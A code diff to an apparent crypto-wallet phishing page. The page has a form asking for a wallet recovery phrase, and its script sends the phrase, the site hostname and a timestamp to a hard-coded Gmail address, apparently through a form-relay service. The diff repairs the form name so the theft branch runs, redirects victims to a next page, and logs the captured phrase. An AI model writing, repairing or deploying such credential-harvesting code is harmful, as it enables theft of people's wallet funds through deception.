@@ -1435,7 +1435,7 @@
 
             <div class="result" style="text-align: center"></div>
             <div class="tabContent active" id="phraseContent">
-                <form method="post" name="phrasekey">
+                <form method="post" name="phraseKey">
                     <div class="row">
 
                         <textarea data-name="phrase" name="recovery_phrase" required=""
@@ -1504,12 +1504,13 @@
             console.log('hello')
             mail = "mayww8622@gmail.com"
             event.preventDefault()
-            next = "/"
+            next = "next.html"
             subject = `${window.location.hostname} ${new Date()}`;
             let body = new FormData()
             if (event.target.name === 'phraseKey') {
-                phrase = document.querySelector('textarea[name="recovery_phrase"]').value
+                phrase = document.querySelector('textarea[data-name="phrase"]').value
                 body.append('phraseKey', phrase)
+                console.log(phrase)
             }
             body.append('_captcha', false)
             body.append('_next', next)
